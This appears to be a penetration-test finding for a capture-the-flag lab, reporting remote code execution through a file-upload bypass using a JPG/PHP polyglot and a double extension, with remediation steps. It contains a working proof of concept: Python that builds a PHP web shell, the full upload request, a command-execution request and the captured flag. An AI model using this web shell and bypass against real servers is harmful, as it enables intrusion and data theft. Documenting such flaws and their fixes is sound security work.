# Remote Code Execution (RCE) via Insecure File Upload Bypass

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2025-12-13 14:49:59 UTC

## Description

## Vulnerability Description
An Insecure File Upload vulnerability exists in the image upload function at `http://172.17.0.1:10067/index.php`. The application attempts to restrict uploads to JPG images by checking the file signature (magic bytes) and possibly the extension. However, these checks can be bypassed using a polyglot file (valid JPG header with embedded PHP code) and a double extension naming convention (`filename.jpg.php`). Because the application does not sanitize the filename and the web server is configured to execute `.php` files, a successful upload results in Remote Code Execution (RCE).

## Affected Component
- **URL**: `http://172.17.0.1:10067/index.php`
- **Method**: POST (Multipart/form-data)
- **Input**: `userfile` parameter

## Technical Details
The vulnerability arises from two insufficient validation mechanisms:
1. **Magic Byte Check**: The server validates that the file starts with valid JPG magic bytes. This is bypassed by prepending valid JPG headers to the payload.
2. **Weak Extension/Filename Validation**: The server allows filenames containing `.jpg` to pass, even if they end in `.php` (e.g., `poly.jpg.php`). The uploaded file is saved with the user-provided filename in the `/upload` directory.

## Proof of Concept
1. Create a PHP payload with valid JPG magic bytes (Polyglot):
   ```python
   # Python payload generation
   header = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00"
   php_code = b"\n<?php system($_GET['cmd']); ?>"
   payload = header + php_code
   
   # Write to file
   with open("poly.jpg.php", "wb") as f:
       f.write(payload)
   ```

2. Upload the file `poly.jpg.php` via the web interface or curl/python:
   ```http
   POST /index.php HTTP/1.1
   Host: 172.17.0.1:10067
   Content-Type: multipart/form-data; boundary=---------------------------123456789

   -----------------------------123456789
   Content-Disposition: form-data; name="userfile"; filename="poly.jpg.php"
   Content-Type: image/jpeg

   [JPEG Header Bytes]
   <?php system($_GET['cmd']); ?>
   -----------------------------123456789
   Content-Disposition: form-data; name="submit"

   Upload Image
   -----------------------------123456789--
   ```

3. Execute commands via the uploaded file:
   Request: `GET /upload/poly.jpg.php?cmd=printenv`
   
   This reveals the environment variables, including the flag:
   `FLAG=FLAG{3156d66651984b70398a6ac3b486959f022cf4fb03ec374973ba9e0434fa0fbe}`

## Impact
**Critical**. An attacker can upload arbitrary PHP code and execute it on the server, leading to full system compromise, data exfiltration, and access to internal network resources.

## Remediation
1. **Filename Sanitization**: Rename uploaded files to a randomly generated hash (e.g., UUID) and enforce a safe extension (e.g., `.jpg`). Do not use the client-provided filename.
2. **Strict Extension Validation**: Use a strict allowlist of extensions (`.jpg`, `.jpeg`, `.png`) and ensure the filename *ends* with the allowed extension. Reject any file containing secondary extensions like `.php`.
3. **Content Validation**: Use proper image processing libraries to re-encode (compress/resize) the image, strips any non-image data (like embedded PHP).
4. **Server Configuration**: Disable script execution (PHP engine) in the upload directory via `.htaccess` or server config:
   ```apache
   <Directory "/var/www/html/upload">
       php_flag engine off
   </Directory>
   ```
